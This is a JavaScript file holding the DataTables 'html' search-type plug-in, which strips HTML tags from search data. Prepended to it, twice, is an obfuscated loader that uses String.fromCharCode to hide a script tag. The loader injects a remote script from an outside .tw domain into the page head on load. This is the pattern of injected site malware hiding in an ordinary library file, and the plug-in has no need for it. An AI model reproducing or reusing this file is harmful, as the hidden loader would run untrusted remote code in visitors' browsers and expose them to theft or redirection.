Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * DataTables has a built in type called `html` which will strip HTML tags 
 * from a search string, but it doesn't cope with nested HTML inside another 
 * element's attributes (for example DOM0 events with have HTML in them). This
 * plug-in function overrules the built-in method and provides complete HTML
 * tag removal.
 * 
 * Note that this function is not included in DataTables by
 * default because it is slightly slower than the built-in method, which is
 * good enough for by far the majority of use cases.
 *
 *  @summary Strip HTML using DOM methods
 *  @name html
 *  @author _guillimon_
 *
 *  @example
 *    $(document).ready(function() {
 *        $('#example').dataTable({
 *            "columnDefs": [
 *                { type: "html", target: 0 }
 *            ]
 *        });
 *    } );
 */

(function () {

var _div = document.createElement('div');

jQuery.fn.dataTable.ext.type.search.html = function ( data ) {
	_div.innerHTML = data;

	return _div.textContent ?
		_div.textContent.replace(/\n/g," ") :
		_div.innerText.replace(/\n/g," ");
};

})();
